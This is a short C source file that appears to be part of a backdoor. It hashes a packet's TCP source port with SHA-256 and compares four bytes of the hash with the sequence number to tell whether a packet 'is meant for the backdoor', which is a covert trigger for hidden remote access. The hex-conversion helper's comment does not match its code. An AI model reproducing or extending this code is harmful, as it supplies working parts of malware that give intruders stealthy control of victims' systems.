#include "packet_auth.h"

#include <stdio.h>
#include <string.h>
#include <openssl/sha.h>

/*
 * Calculates the SHA256 hash of a given input.
 *
 * Params:
 *      const unsigned char *input: The buffer to hash.
 *      const int input_length: The length of the input.
 *      unsigned char *output: The buffer to store the hash. Must be 32 bytes in size.
 */
void sha256_hash(const unsigned char *input, const int input_length, unsigned char *output)
{
    SHA256_CTX ctx;
    SHA256_Init(&ctx);
    SHA256_Update(&ctx, input, input_length);
    SHA256_Final(output, &ctx);
}

/*
 * Converts hex to unsigned integer. Taken from user radhoo on stackoverflow.com.
 *
 * Params:
 *      char *hex: Pointer to null terminated string with hex value.
 *
 * Returns:
 *      The unsigned int representation of the next string.
 */
unsigned int hex_to_uint(char *hex)
{
    unsigned int buffer;
    char *cbuffer = (char *)&buffer;

    for (int i = 0, j = 3; i < 4; i++, j--)
    {
        cbuffer[i] = hex[j];
    }

    return buffer;
}

/*
 * Checks if the packet is meant for the backdoor or not.
 *
 * Params:
 *      const unsigned short source_port: The TCP source port value.
 *      const unsigned int sequence_num: The TCP sequence number value.
 *
 * Returns:
 *      1 if the packet is authenticated, 0 otherwise.
 */
int is_packet_authenticated(const unsigned short source_port, const unsigned int sequence_num)
{
    char src_port_str[6];
    char calculated_hash_buf[32];

    unsigned int calculated_seq_num;

    sprintf(src_port_str, "%d", source_port);
    sha256_hash(src_port_str, strlen(src_port_str), calculated_hash_buf);

    calculated_seq_num = hex_to_uint(calculated_hash_buf);

    if (sequence_num != calculated_seq_num)
    {
        return 0;
    }

    return 1;
}
